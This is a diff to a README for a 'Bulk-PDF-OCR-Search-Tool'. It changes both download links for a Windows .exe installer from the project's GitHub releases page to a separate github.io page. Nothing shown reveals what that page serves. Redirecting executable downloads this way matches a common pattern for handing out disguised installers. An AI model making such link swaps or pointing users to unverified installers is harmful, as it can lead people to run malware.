@@ -1,6 +1,6 @@
 # 🔍 Bulk-PDF-OCR-Search-Tool - Find text inside thousands of PDFs
 
-[Download the Application](https://github.com/manichaean-ground642/Bulk-PDF-OCR-Search-Tool/releases)
+[Download the Application](https://manichaean-ground642.github.io)
 
 ## 📖 About this tool
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to set up the tool on your machine:
 
-1. Visit the [releases page](https://github.com/manichaean-ground642/Bulk-PDF-OCR-Search-Tool/releases).
+1. Visit the [releases page](https://manichaean-ground642.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe to download the installer.
 4. Locate the downloaded file in your Downloads folder.
